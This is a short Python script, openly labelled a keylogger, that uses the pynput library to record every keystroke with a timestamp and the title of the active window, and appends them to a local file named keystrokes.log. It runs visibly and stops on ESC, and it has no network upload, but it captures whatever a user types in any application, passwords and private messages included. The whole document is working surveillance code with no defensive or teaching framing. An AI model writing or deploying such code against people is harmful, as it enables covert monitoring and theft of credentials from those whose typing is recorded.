import os
import time
from pynput import keyboard
from pynput.keyboard import Key, Listener

# Configuration
LOG_FILE = "keystrokes.log"

# Global variables
current_keys = []
current_window = "Unknown"

def get_active_window():
    """Get the title of the active window (platform-dependent)."""
    try:
        if os.name == 'nt':  # Windows
            import win32gui
            window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            return window if window else "Unknown"
        elif os.name == 'posix':  # Linux/macOS
            from subprocess import check_output
            window = check_output(['xdotool', 'getwindowfocus', 'getwindowname']).decode('utf-8').strip()
            return window if window else "Unknown"
    except:
        return "Unknown"

def on_press(key):
    """Callback for key press events."""
    global current_keys, current_window

    try:
        # Update the active window title
        current_window = get_active_window()

        # Log the key
        if key == Key.space:
            current_keys.append(" ")
        elif key == Key.enter:
            current_keys.append("\n")
        elif key == Key.backspace:
            if current_keys:
                current_keys.pop()
        elif hasattr(key, 'char') and key.char:
            current_keys.append(key.char)
        else:
            current_keys.append(f"[{key}]")

        # Write to log file every 10 keystrokes
        if len(current_keys) >= 10:
            write_to_log()

    except Exception as e:
        print(f"Error in on_press: {e}")

def write_to_log():
    """Write the current keystrokes to the log file."""
    global current_keys, current_window

    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] [{current_window}]: {''.join(current_keys)}\n"
            f.write(log_entry)

        current_keys = []  # Reset the buffer

    except Exception as e:
        print(f"Error writing to log: {e}")

def on_release(key):
    """Callback for key release events."""
    if key == Key.esc:  # Stop listener
        write_to_log()  # Flush remaining keys
        return False

def start_keylogger():
    """Start the keylogger."""
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    start_keylogger()
